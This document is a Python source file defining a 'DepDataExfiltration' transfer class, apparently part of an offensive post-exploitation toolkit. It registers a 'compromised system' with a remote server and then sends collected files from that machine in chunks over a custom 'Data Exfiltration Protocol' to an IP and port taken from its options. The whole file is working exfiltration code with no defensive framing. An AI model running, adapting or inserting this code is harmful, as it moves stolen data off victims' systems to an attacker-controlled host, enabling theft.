import os
import time

from dep_client.client.Client import Client as DEPClient
from dep_client.util.Util import Util as DEPClientUtil
from dep_common.converter.Converter import Converter as DEPConverter

from npdep_transfer.base.Transfer import Transfer

'''
Transfers data through the Use of Data Exfiltration Protocol (DEP)
'''
class DepDataExfiltration(Transfer):
    def __init__(self, options, registration) -> None:
        super().__init__("DepDataExfiltration", options, registration)
        self.client = DEPClient(options["ip"], options["port"], options["pkgSize"])

    def init(self):
        b_uuid = DEPConverter.uuidToBytes(self.registration.id)
        # Compromised system is registered at the server
        self.client.sendSystemInformationMessage(b_uuid)

    def send(self, container):
        b_uuid = DEPConverter.uuidToBytes(self.registration.id)

        # Check for data
        for data in container["data"]:
            fileName = data["source"] + "-" + data["name"] + ".txt"
            path = os.path.join(data["path"], fileName)
            b_sha256 = bytearray(32)
            fileSize = [len(i) for i in data["content"]][0]
            self.client.sendDataInformationMessage(b_uuid, b_sha256, path, fileSize)
            for content in data["content"]:
                time.sleep(.8) # This sleep is necessary to realize smooth data sending
                # From now on, the file will be read in chunks to be transfered to the server
                DEPClientUtil.sendDataWithDataContentMessage(self.client, self.options["ip"], self.options["port"], self.options["pkgSize"], content, b_uuid, b_sha256)